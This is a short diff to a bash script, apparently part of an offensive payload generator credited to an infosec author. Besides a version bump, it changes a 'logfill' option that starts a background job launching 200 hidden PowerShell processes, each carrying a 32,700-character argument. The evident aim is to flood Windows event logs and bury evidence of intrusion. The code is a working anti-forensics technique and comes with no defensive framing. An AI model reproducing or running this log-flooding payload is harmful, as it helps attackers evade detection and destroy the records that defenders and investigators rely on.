@@ -4,7 +4,7 @@
 #Mastadon: 4ndr34z@infosec.exchange
 #Web: https://f20.be
 DIR="$1"
-version="1.6.7"
+version="1.6.8"
 
 ### Colors ##
 ESC=$(printf '\033') RESET="${ESC}[0m" BLACK="${ESC}[30m" RED="${ESC}[31m"
@@ -702,7 +702,7 @@ fi
 if [ $logf == 1 ]
 
         then   
-            logfill="start-job{\$t = \$(\"0\"*32700) ;For (\$i = 0; \$i -lt 155; \$i++) {Start-Process powershell.exe -WindowStyle hidden -Argument \"\$t;Exit\"}};"
+            logfill="start-job{\$t = \$(\"0\"*32700) ;For (\$i = 0; \$i -lt 200; \$i++) {Start-Process powershell.exe -WindowStyle hidden -Argument \"\$t;Exit\"}};"
         else 
             logfill=""
 fi 
